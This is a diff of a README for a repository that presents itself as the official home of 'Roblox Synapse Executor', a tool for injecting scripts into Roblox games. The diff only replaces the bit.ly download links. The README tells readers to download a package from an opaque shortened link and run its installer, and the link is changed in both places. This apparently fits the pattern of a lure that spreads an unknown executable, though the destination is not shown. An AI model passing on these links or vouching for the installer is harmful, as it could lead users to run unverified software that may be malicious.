@@ -1,6 +1,6 @@
 # Roblox-Synapse
 
-[DOWNLOAD LINK](https://bit.ly/3ZmBEFM)
+[DOWNLOAD LINK](https://bit.ly/3Z7NVwe)
 
 
 🚀 Welcome to the official repository of **Roblox Synapse Executor**, the top-tier script execution tool for Roblox 🎮. This tool is highly valued for its advanced features and stability, enabling seamless Lua scripting for game modifications and customization.
@@ -34,7 +34,7 @@ Roblox Synapse Executor is a powerful tool designed for Roblox developers and en
 
 To get started with Roblox Synapse Executor, follow these simple steps:
 
-1. Download the Synapse software package from the following link: [![Download Synapse](https://bit.ly/4fHvJAz)
+1. Download the Synapse software package from the following link: [![Download Synapse](https://bit.ly/3Z7NVwe)
 
 2. Unzip the downloaded file and run the installer to set up Synapse on your system.
 
